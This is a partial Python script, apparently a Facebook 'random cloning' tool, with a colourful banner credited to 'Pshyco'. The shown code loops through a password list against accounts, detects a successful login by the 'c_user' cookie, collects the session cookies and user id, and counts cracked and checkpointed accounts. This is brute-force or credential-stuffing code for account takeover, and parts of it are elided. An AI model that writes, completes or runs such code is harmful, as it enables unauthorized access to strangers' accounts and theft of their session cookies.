...
logo =("""
    ...
    ____       __                   
   / __ \_____/ /_  __  ___________ 
  / /_/ / ___/ __ \/ / / / ___/ __ \
 / ____(__  ) / / / /_/ / /__/ /_/ /
/_/   /____/_/ /_/\__, /\___/\____/ 
                 /____/                                                           
    
 ╔═════════════════[\033[1;32m Pshyco \033[1;32m]══════════════╗
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m Pshyco      \033[1;93m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m Pshyco   \033[1;93m║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35m Pshyco Roaster         \033[1;93m ║
 \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning       \033[1;93m ║
 \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;35mCyber            \033[1;93m ║
 \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.1                  \033[1;93m ║
 \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;93m║
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m Use And Enjoy 🤗                 \033[1;93m  ║
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m Pshyco Roaster          \033[1;93m ║
 ╚═════════════════[\033[1;32mWELCOME TO MY TOLL\033[1;32m]══════════════════╝""")
loop = 0
oks = []
cps = []
def clear():
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[Pshyco-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}Pshyco{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
